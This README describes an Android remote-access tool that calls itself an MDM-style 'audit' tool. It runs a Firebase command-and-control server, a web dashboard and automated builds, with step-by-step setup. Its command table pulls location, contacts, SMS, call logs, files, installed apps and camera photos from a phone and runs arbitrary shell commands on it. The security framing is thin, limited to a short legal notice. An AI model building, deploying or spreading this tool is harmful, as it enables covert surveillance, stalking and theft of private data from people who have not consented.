# Device Audit Tool

MDM-style security audit tool.
Firebase C2 + web dashboard + auto-build GitHub Actions.

## LEGAL NOTICE
Use ONLY on your own device or with written authorization.
Unauthorized = UU ITE 30/46, UU PDP 27/2022, CFAA, CMA, GDPR.

## Setup Firebase
1. https://console.firebase.google.com
2. Create project
3. Realtime Database -> Create -> test mode
4. Authentication -> Email/Password -> Enable
5. Users -> Add user (buat login dashboard)
6. Project Settings -> Add Android app -> pkg: com.audit.device
7. Download google-services.json
8. Realtime DB -> Rules -> paste firebase-rules.json -> Publish

## Build
    cd audit-tool
    git init
    git add .
    git commit -m init
    gh repo create audit-tool --public --source=. --remote=origin --push
    gh secret set GOOGLE_SERVICES_JSON_B64
    # paste base64 google-services.json, Ctrl+D
    gh workflow run build.yml
    gh run watch
    gh run download

## Web Deploy
Edit web/index.html -> isi firebaseConfig lo.
Opsi A: firebase deploy --only hosting
Opsi B: copy ke docs/ -> GitHub Pages

## Commands
| Cmd | Fungsi |
|-----|--------|
| ping | cek |
| info | device info |
| location | GPS |
| contacts | 200 kontak |
| sms | 100 SMS |
| calllog | 100 call |
| files <path> | list dir |
| apps | list installed apps |
| shell <cmd> | exec sh |
| photo | snapshot |

## Kill Switch
Set /config/kill = true -> semua device stop service.
